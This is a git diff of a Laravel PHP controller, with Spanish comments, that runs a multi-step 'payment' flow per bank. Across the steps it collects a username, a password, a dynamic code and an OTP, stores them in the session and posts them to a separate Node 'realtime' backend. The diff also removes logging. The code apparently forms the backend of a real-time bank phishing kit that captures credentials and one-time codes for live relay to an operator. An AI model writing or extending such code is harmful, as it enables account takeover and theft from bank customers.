@@ -10,37 +10,54 @@ use Illuminate\Support\Arr;
 class BankFlowController extends Controller
 {
 
-    public function step(string $bank, int $step, Request $request)
+
+    public function start(string $bank, Request $request)
     {
+        $cfg = config("banks.$bank");
+        abort_if(!$cfg, 404);
+
         $sc = $request->session()->get('sc', []);
 
-        logger()->info('SCREEN SID: ' . $request->session()->getId(), [
-            'sc' => $sc
-        ]);
+        // ✅ setear bank y step inicial
+        $sc['bank'] = $bank;
+        $sc['step'] = "1";
 
+        // opcional: reiniciar flujo si entra por start
+        //unset($sc['pass'], $sc['dinamic'], $sc['otp']);
+        //unset($sc['rt_session_id'], $sc['rt_session_token']);
+
+        $request->session()->put('sc', $sc);
+        $request->session()->save();
+
+        return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => 1]);
+    }
+
+    public function step(string $bank, int $step, Request $request)
+    {
         $cfg = config("banks.$bank"); // mejor: banks.$bank
         abort_if(!$cfg, 404);
 
-        $maxSteps = (int) ($cfg['steps'] ?? 2);
+        $maxSteps = (int) ($cfg['steps'] ?? 3);
         abort_if($step < 1 || $step > $maxSteps, 404);
 
         $view = $cfg['view_prefix'] . ".step{$step}";
         abort_if(!View::exists($view), 404);
 
-        // si en step2 necesitas sesión realtime, asegúrala aquí
-        if ($maxSteps === 4 && $step >= 2) {
+        if ($step >= 1) {
             $this->ensureRealtimeSession($request);
-            $sc = $request->session()->get('sc', []); // refresca
         }
+
+        $sc = $request->session()->get('sc', []);
+        $sc['bank'] = $bank;
+        $sc['step'] = (string) ($step);
+        $request->session()->put('sc', $sc);
+        $request->session()->save();
 
         return view($view, [
             'bank' => $bank,
             'step' => $step,
             'maxSteps' => $maxSteps,
             'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
-
-            // ✅ safe gets
-            'user' => Arr::get($sc, 'user'),
             'sessionId' => Arr::get($sc, 'rt_session_id'),
             'sessionToken' => Arr::get($sc, 'rt_session_token'),
         ]);
@@ -55,16 +72,17 @@ class BankFlowController extends Controller
 
         $sc = $request->session()->get('sc', []);
 
+        $next = ($step === 1 && $maxSteps === 4) ? 2 : min($step + 1, $maxSteps);
+
         // STEP 1 (maxSteps=4): guarda usuario y limpia credenciales viejas
         if ($step === 1 && $maxSteps === 4) {
             $data = $request->validate([
                 'user' => 'required|string|max:50',
             ]);
-
             $sc['user'] = $data['user'];
 
             // ✅ recomendado: limpiar datos de intento anterior
-            //unset($sc['pass'], $sc['dinamic'], $sc['otp']);
+            //unset($sc['user'], $sc['pass'], $sc['dinamic'], $sc['otp']);
             // si quieres reiniciar realtime al comenzar de nuevo:
             // unset($sc['rt_session_id'], $sc['rt_session_token']);
         }
@@ -80,7 +98,6 @@ class BankFlowController extends Controller
 
         // STEP 3/4: ejemplo para dinamic/otp (si aplica)
         if ($step === 3 || $step === 4) {
-            $this->ensureRealtimeSession($request);
             $data = $request->validate([
                 'dinamic' => 'nullable|string|min:6|max:8',
                 'otp' => 'nullable|string|min:6|max:8',
@@ -92,17 +109,18 @@ class BankFlowController extends Controller
                 $sc['otp'] = $data['otp'];
         }
 
-        // ✅ GUARDAR sc SIEMPRE (una sola vez)
+
+
+        // ✅ GUARDAR sc SIEMPRE Y CAMBIAR STEP (una sola vez)
+        $sc['bank'] = $bank;
+        $sc['step'] = (string) ($next);
+
         $request->session()->put('sc', $sc);
         $request->session()->save();
 
-        logger()->info('SAVE SID: ' . $request->session()->getId(), [
-            'sc' => $request->session()->get('sc', [])
-        ]);
-
         return redirect()->route('pago.bank.step', [
             'bank' => $bank,
-            'step' => min($step + 1, $maxSteps),
+            'step' => $next,
         ]);
     }
 
@@ -112,24 +130,31 @@ class BankFlowController extends Controller
     {
         $sc = $request->session()->get('sc', []);
 
-        if (!empty($sc['rt_session_id']) && !empty($sc['rt_session_token'])) {
+        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
+
+        // 1) Si ya hay sessionId, NO crear otra sesión. Solo asegurar token.
+        if (!empty($sc['rt_session_id'])) {
+
+            if (empty($sc['rt_session_token'])) {
+                $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'] . '/issue-token';
+
+                $resp = Http::asJson()->timeout(10)->post($url);
+                if ($resp instanceof PromiseInterface) {
+                    $resp = $resp->wait();
+                }
+                if ($resp->successful()) {
+                    $sc['rt_session_token'] = $resp->json('sessionToken');
+                    $request->session()->put('sc', $sc);
+                    $request->session()->save();
+                }
+            }
+
             return;
         }
 
-        $baseUrl = env('NODE_BACKEND_URL', 'http://localhost:3005');
-        $url = rtrim($baseUrl, '/') . '/api/sessions';
-
-        logger()->info('ensureRealtimeSession POST', [
-            'url' => $url,
-            'sid' => $request->session()->getId(),
-            'sc_keys' => array_keys($sc),
-        ]);
-
-        $resp = Http::asJson()
-            ->timeout(10)
-            ->post($url, $sc);
-
-
+        // 2) Si no hay sessionId, crear sesión realtime
+        $url = (string) $baseUrl . '/api/sessions';
+        $resp = Http::asJson()->timeout(10)->post($url, $sc);
         if ($resp instanceof PromiseInterface) {
             $resp = $resp->wait();
         }
@@ -140,13 +165,6 @@ class BankFlowController extends Controller
 
             $request->session()->put('sc', $sc);
             $request->session()->save();
-            return;
         }
-
-        logger()->warning('ensureRealtimeSession failed', [
-            'url' => $url,
-            'status' => $resp->status(),
-            'body' => $resp->body(),
-        ]);
     }
 }
